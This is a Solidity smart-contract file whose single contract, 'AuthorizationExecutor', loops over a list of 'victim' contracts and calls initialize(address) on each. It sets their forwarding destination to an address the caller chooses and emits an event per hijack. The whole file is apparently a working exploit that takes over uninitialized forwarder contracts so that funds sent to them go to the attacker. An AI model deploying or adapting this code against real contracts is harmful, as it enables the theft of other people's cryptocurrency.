// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Forwarder {
    function destination() external view returns (address payable);
    function initialize(address payable _destination) external;
}

contract AuthorizationExecutor {
    error InitializeFailed(address victim, address destination, bytes reason);
    event ForwardingSetup(
        address indexed victim,
        address destination,
        bool success
    );

    function setupForwarding(
        address[] memory victims,
        address payable[] memory destinations
    ) external {
        require(victims.length == destinations.length, "Array length mismatch");
        for (uint256 i = 0; i < victims.length; i++) {
            (bool success, bytes memory reason) = victims[i].call(
                abi.encodeWithSignature("initialize(address)", destinations[i])
            );
            emit ForwardingSetup(victims[i], destinations[i], success);
            if (!success) {
                revert InitializeFailed(victims[i], destinations[i], reason);
            }
        }
    }
}